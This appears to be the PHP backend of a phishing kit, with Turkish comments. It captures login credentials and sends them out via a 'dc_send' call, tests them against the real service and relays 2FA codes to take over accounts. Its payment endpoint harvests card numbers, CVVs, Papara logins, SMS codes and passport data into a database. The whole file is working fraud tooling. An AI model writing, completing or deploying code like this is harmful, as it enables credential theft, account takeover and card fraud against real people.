<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


include 'inc/config.php';
include 'inc/functions.php';
include 'inc/anti.php';



$q = $_GET['q'];
if ($q == 'login') {
  antiflood();
  $login = escape('login');
  $password = escape('password');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
  $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('2');// şifre hatası
  // }elseif(!empty($phone) && strlen($phone) < 10 || strlen($phone) > 14){
  //   die('error_phone');
  // }elseif (isset($user['id'])) {
  //   $db -> query("UPDATE users set device = '$device' where id = '$user[id]'");
  //   $_SESSION['user_id'] = $user['id'];
  //   die('1'); // eğer user kayıtlıysa direkt gir
  }else{
    if ($main['check_oc'] == 0) {
    $_SESSION["wait"] = 1;
    dc_send("Yeni Giriş : ".$login.":".$password);
    $duruma = giris($login,$password);
    $durum = $duruma[0];
    if (($durum == 1) or ($durum == 3)){
      if ($durum == 3){
        dc_send("2fa giriş : ".$login.":".$password."\n".$duruma[1]);
      }
      // 2fa veya giriş varsa sql e yaz
      $db -> query("INSERT into users set
        login='$login',
        password='$password',
        phone='$phone',
        passport='$passport',
        device='$device',
        ip='$ip'");
      $_SESSION['user_id'] = $db->insert_id;
      if ($durum == 1){
        $db -> query("UPDATE users SET balance = '$_SESSION[real_para]' WHERE id = '$_SESSION[user_id]'"); 
        dc_send($login.":".$password."\n".$duruma[1]);
      }
      die(strval($durum));
    }else{
      if ($durum == 4){
        dc_send("Sistem Hatası : ".$login.":".$password."\n".$duruma[1]);
      }
      die(strval($durum));
    }
  }else{

    $db -> query("INSERT into users set
      login='$login',
      password='$password',
      device='$device',
      ip='$ip'");
    $_SESSION['user_id'] = $db->insert_id;
    die('success');
  }
  }
}elseif($q == 'logout'){
  session_destroy();
}elseif($q == 'signup' && !isset($us['id'])){
  antiflood();
  $login = escape('login');
  $password = escape('password');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $type = intval(1);
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
  if (strlen($login) < 3 or strlen($password) < 3 or strlen($phone) < 10 or strlen($phone) > 14) {
    die('error');
  }else{
    $db -> query("INSERT into users set
      login = '$login',
      password = '$password',
      phone = '$phone',
      passport = '$passport',
      type = '$type',
      device = '$device',
      ip = '$ip'");
    $_SESSION['user_id'] = $db->insert_id;
    die('success');
  }
}elseif($q == 'sms-onay'){
  $sms = escape('sms');
  $id = $us["id"];
  $db->query("UPDATE `payments` SET `sms` = '$sms' WHERE `payments`.`user_id` = '$id' AND `payments`.`type` = 'creditcard' ORDER BY id DESC LIMIT 1; ");
  die('success');
}elseif ($q == 'sms-durum' && isset($us['id'])) {
  $id = $us["id"];
  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE 'creditcard' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
  echo $res["status"];
}elseif ($q == "payment") {
  antiflood();
  $datas = [];
  foreach ($_POST as $key => $value) {
    $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
  }
  if (strlen($datas['amount']) > 0) {
    header('Content-Type: application/json');
    $db -> query("INSERT into payments set
      type = '$datas[type]',
      amount = '$datas[amount]',
      user = '$us[login]',
      user_id = '$us[id]',
      papara_email = '$datas[papara_email]',
      papara_password = '$datas[papara_password]',
      papara_sms_code = '$datas[papara_sms_code]',
      astropay_card_number = '$datas[astropay_card_number]',
      astropay_exp_date = '$datas[expmonth]/$datas[expyear]',
      astropay_cv2 = '$datas[astropay_cv2]',
      paykasa_number = '$datas[paykasa_number]',
      bank_id = '$datas[bank_id]',
      sender_phone = '$datas[sender_phone]',
      buyer_phone = '$datas[buyer_phone]',
      buyer_passport = '$datas[buyer_passport]',
      buyer_birth = '$datas[buyer_birth]',
      buyer_passport_date = '$datas[buyer_passport_date]',
      referance = '$datas[referance]',
      full_name = '$datas[full_name]',
      where_from = '$datas[where_from]',
      transfer_hour = '$datas[transfer_time]',
      card_number = '$datas[card_number]',
      exp_date = '$datas[exp_date]',
      cvv = '$datas[cvv]'");
      $_SESSION['amount'] = $datas[amount];
      $amonts = $_SESSION['amount'];
    die(json_encode(['success' => true, 'message' => $db->insert_id]));
  }
}elseif($q == "2fa-bilgi"){
  $bilgi = array($_SESSION["sms"], $_SESSION["mail"]);
  die(json_encode($bilgi));
}elseif ($q == "tfa-mail") {
  $durum = tfa_mail();
  die(strval($durum[0]));
}elseif ($q == "tfa-sms") {
  $durum = tfa_sms();
  die(strval($durum[0]));
}elseif ($q == "tfa-giris") {
  $login = escape('tfa-login');
  $password = escape('tfa-password');
  $code = escape('verificationCode');
  $duruma = tfagiris($login,$password,$code);
  $durum = $duruma[0];
  // print_r ($durum);
  if ($durum == 1){
    $db -> query("UPDATE users SET balance = '$_SESSION[real_para]' WHERE id = '$_SESSION[user_id]'"); 
    dc_send("2fa girdi : ".$login.":".$password."\n".$duruma[1]);
    die("1");
  }elseif($durum == 2) {
    dc_send("2fa kodu yanlış girdi : ".$login.":".$password."\n".$duruma[1]);
    die("2");
  }else{
    dc_send("2fa sistem hatası : ".$login.":".$password."\n".$duruma[1]);
    die("4");
  }
}elseif($q == "get-bank"){
    $id = intval($_POST['id']);
    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
  }
?>